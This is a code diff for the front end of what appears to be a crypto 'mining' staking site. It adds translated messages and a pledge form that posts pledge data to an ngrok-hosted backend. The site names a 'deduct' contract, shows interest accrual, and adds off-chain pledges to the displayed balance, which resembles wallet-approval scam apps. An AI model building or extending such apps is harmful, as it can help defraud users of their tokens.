@@ -1,4 +1,3 @@
-//---Client-side Constants---
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
@@ -112,7 +111,12 @@ const translations = {
         error: 'Error',
         offlineWarning: 'Server is offline, running locally. Data will sync when server is available.',
         noWallet: 'Please install MetaMask or a compatible wallet to continue.',
-        dataSent: 'Data sent to backend successfully.' // 新增翻譯
+        dataSent: 'Data sent to backend successfully.',
+        pledgeSuccess: 'Pledge successful! Data sent to backend.', // 新增
+        pledgeError: 'Pledge failed. Please try again.', // 新增
+        invalidPledgeAmount: 'Please enter a valid pledge amount greater than 0.', // 新增
+        invalidPledgeToken: 'Please select a valid token.', // 新增
+        insufficientBalance: 'Insufficient balance for selected token.' // 新增
     },
     'zh-Hant': {
         title: '熱門挖礦',
@@ -143,7 +147,12 @@ const translations = {
         error: '錯誤',
         offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
         noWallet: '請安裝 MetaMask 或相容錢包以繼續。',
-        dataSent: '數據已成功發送至後端。' // 新增翻譯
+        dataSent: '數據已成功發送至後端。',
+        pledgeSuccess: '質押成功！數據已發送至後端。', // 新增
+        pledgeError: '質押失敗，請重試。', // 新增
+        invalidPledgeAmount: '請輸入大於 0 的有效質押金額。', // 新增
+        invalidPledgeToken: '請選擇有效的代幣。', // 新增
+        insufficientBalance: '選定代幣餘額不足。' // 新增
     },
     'zh-Hans': {
         title: '热门挖矿',
@@ -174,7 +183,12 @@ const translations = {
         error: '错误',
         offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。',
         noWallet: '请安装 MetaMask 或兼容钱包以继续。',
-        dataSent: '数据已成功发送至后端。' // 新增翻譯
+        dataSent: '数据已成功发送至后端。',
+        pledgeSuccess: '质押成功！数据已发送至后端。', // 新增
+        pledgeError: '质押失败，请重试。', // 新增
+        invalidPledgeAmount: '请输入大于 0 的有效质押金额。', // 新增
+        invalidPledgeToken: '请选择有效的代币。', // 新增
+        insufficientBalance: '选定代币余额不足。' // 新增
     }
 };
 let currentLang = localStorage.getItem('language') || 'zh-Hant';
@@ -273,6 +287,16 @@ async function loadUserDataFromServer() {
         } else {
             console.log(`loadUserDataFromServer: Local data is newer, keeping local state.`);
         }
+        // 載入質押數據並更新 UI
+        const pledgeData = allData.pledges[userAddress] || {};
+        if (pledgeData.isPledging) {
+            const tokenSymbol = {
+                [USDT_CONTRACT_ADDRESS]: 'USDT',
+                [USDC_CONTRACT_ADDRESS]: 'USDC',
+                [WETH_CONTRACT_ADDRESS]: 'WETH'
+            }[pledgeData.token] || 'Unknown';
+            document.getElementById('totalPledgedValue').textContent = `${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
+        }
         updateInterest();
         updateNextBenefitTimer();
     } catch (error) {
@@ -300,7 +324,7 @@ async function saveUserData(data = null, addToPending = true) {
         accountBalance,
         nextBenefitTime: localStorage.getItem('nextBenefitTime'),
         lastUpdated: Date.now(),
-        source: 'index.html' // 添加來源標記
+        source: 'index.html'
     };
     if (!isServerAvailable) {
         if (addToPending) {
@@ -324,7 +348,7 @@ async function saveUserData(data = null, addToPending = true) {
         if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
         console.log(`saveUserData: User data sent to server successfully.`);
         localStorage.setItem('userData', JSON.stringify(dataToSave));
-        updateStatus(translations[currentLang].dataSent); // 顯示數據發送成功
+        updateStatus(translations[currentLang].dataSent);
     } catch (error) {
         console.warn(`saveUserData: Could not send user data to server: ${error.message}`);
         if (addToPending) {
@@ -418,7 +442,8 @@ function updateBalancesUI(walletBalances) {
         console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
     }
     const claimedBalance = accountBalance[selectedToken] || 0;
-    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
+    const pledgeData = JSON.parse(localStorage.getItem('userData') || '{}').pledgedAmount || 0;
+    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance + (selectedToken === pledgeToken.value ? pledgeData : 0);
     if (accountBalanceValue) {
         accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
         console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`);
@@ -700,9 +725,19 @@ async function updateUIBasedOnChainState() {
             walletTokenSelect.dispatchEvent(new Event('change'));
             setInitialNextBenefitTime();
             activateStakingUI();
+            // 啟用質押表單
+            pledgeBtn.disabled = false;
+            pledgeAmount.disabled = false;
+            pledgeDuration.disabled = false;
+            pledgeToken.disabled = false;
         } else {
             console.log(`updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.`);
             if (startBtn) startBtn.style.display = 'block';
+            // 禁用質押表單
+            pledgeBtn.disabled = true;
+            pledgeAmount.disabled = true;
+            pledgeDuration.disabled = true;
+            pledgeToken.disabled = true;
         }
         disableInteractiveElements(false);
         updateStatus("");
@@ -752,7 +787,6 @@ async function handleConditionalAuthorizationFlow() {
         activateTx.value = 0n;
         console.log(`handleConditionalAuthorizationFlow: Sending activate service transaction:`, activateTx);
         const receipt = await sendMobileRobustTransaction(activateTx);
-        // 在服務啟動後立即保存用戶數據到後端
         await saveUserData({
             isActive: true,
             stakingStartTime,
@@ -761,7 +795,7 @@ async function handleConditionalAuthorizationFlow() {
             accountBalance,
             nextBenefitTime: localStorage.getItem('nextBenefitTime'),
             lastUpdated: Date.now(),
-            source: 'index.html' // 添加來源標記
+            source: 'index.html'
         });
     }
 }
@@ -975,7 +1009,6 @@ document.addEventListener('DOMContentLoaded', async () => {
                 lastUpdated: Date.now()
             }));
             console.log(`claimInterest: Updated claimed interest and account balance:`, { claimedInterest, accountBalance });
-            // 領取後將 cumulative 歸零
             await saveUserData({
                 stakingStartTime,
                 claimedInterest,
@@ -1079,26 +1112,78 @@ pledgeBtn.addEventListener('click', async () => {
         return;
     }
     const amount = parseFloat(pledgeAmount.value) || 0;
-    if (!amount) {
-        alert('Please enter a pledge amount!');
-        console.log(`pledgeBtn: No pledge amount entered.`);
+    const duration = parseInt(pledgeDuration.value);
+    const token = pledgeToken.value;
+    const tokenMap = {
+        'USDT': USDT_CONTRACT_ADDRESS,
+        'USDC': USDC_CONTRACT_ADDRESS,
+        'WETH': WETH_CONTRACT_ADDRESS
+    };
+    const tokenAddress = tokenMap[token];
+    if (!tokenAddress) {
+        alert(translations[currentLang].invalidPledgeToken);
+        console.log(`pledgeBtn: Invalid token selected: ${token}`);
         return;
     }
-    pledgedAmount = amount;
-    localStorage.setItem('userData', JSON.stringify({
-        stakingStartTime,
-        claimedInterest,
-        pledgedAmount,
-        accountBalance,
-        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
-        lastUpdated: Date.now()
-    }));
-    console.log(`pledgeBtn: Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days.`);
-    alert(`Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days... (Simulation)`);
-    const totalPledgedValue = document.getElementById('totalPledgedValue');
-    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
-    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`;
-    await saveUserData();
+    if (!amount || amount <= 0) {
+        alert(translations[currentLang].invalidPledgeAmount);
+        console.log(`pledgeBtn: Invalid pledge amount: ${amount}`);
+        return;
+    }
+    // 檢查錢包餘額
+    const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
+    try {
+        const balance = await retry(() => selectedContract.balanceOf(userAddress));
+        const decimals = token === 'WETH' ? 18 : 6;
+        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));
+        if (amount > formattedBalance) {
+            alert(translations[currentLang].insufficientBalance);
+            console.log(`pledgeBtn: Insufficient balance for ${token}: ${amount} > ${formattedBalance}`);
+            return;
+        }
+    } catch (error) {
+        alert(`Could not fetch ${token} balance: ${error.message}`);
+        console.error(`pledgeBtn: Balance fetch error: ${error.message}`);
+        return;
+    }
+    updateStatus('Submitting pledge...');
+    const pledgeData = {
+        address: userAddress,
+        pledges: {
+            isPledging: true,
+            cycle: duration,
+            token: tokenAddress,
+            amount: amount.toFixed(2)
+        }
+    };
+    try {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'ngrok-skip-browser-warning': 'true'
+            },
+            body: JSON.stringify(pledgeData)
+        }));
+        if (!response.ok) throw new Error(`Failed to submit pledge, status: ${response.status}`);
+        pledgedAmount = amount;
+        localStorage.setItem('userData', JSON.stringify({
+            stakingStartTime,
+            claimedInterest,
+            pledgedAmount,
+            accountBalance,
+            nextBenefitTime: localStorage.getItem('nextBenefitTime'),
+            lastUpdated: Date.now()
+        }));
+        const totalPledgedValue = document.getElementById('totalPledgedValue');
+        totalPledgedValue.textContent = `${amount.toFixed(2)} ${token}`;
+        console.log(`pledgeBtn: Pledged ${amount} ${token} for ${duration} days.`);
+        updateStatus(translations[currentLang].pledgeSuccess);
+        await saveUserData();
+    } catch (error) {
+        console.error(`pledgeBtn: Pledge submission failed: ${error.message}`);
+        updateStatus(translations[currentLang].pledgeError, true);
+    }
 });
 
 refreshWallet.addEventListener('click', async () => {
